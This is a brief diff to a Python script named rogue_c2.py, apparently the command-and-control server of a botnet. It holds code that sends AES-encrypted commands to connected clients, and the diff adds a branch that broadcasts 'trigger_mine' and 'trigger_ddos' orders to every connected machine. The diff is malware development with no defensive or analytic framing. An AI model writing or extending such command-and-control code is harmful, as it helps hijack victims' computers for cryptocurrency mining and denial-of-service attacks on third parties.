@@ -1,4 +1,4 @@
-# rogue_c2.py
+#!/usr/bin/env python3
 import socket, threading, base64
 from Cryptodome.Cipher import AES
 
@@ -54,6 +54,12 @@ def send_command():
                 clients[index].send(encrypt_message(" ".join(command)))
             except:
                 print("[!] Invalid target index.")
+        elif cmd in ["trigger_mine", "trigger_ddos"]:
+            for conn in clients:
+                try:
+                    conn.send(encrypt_message(cmd))
+                except:
+                    clients.remove(conn)
         else:
             for conn in clients:
                 try:
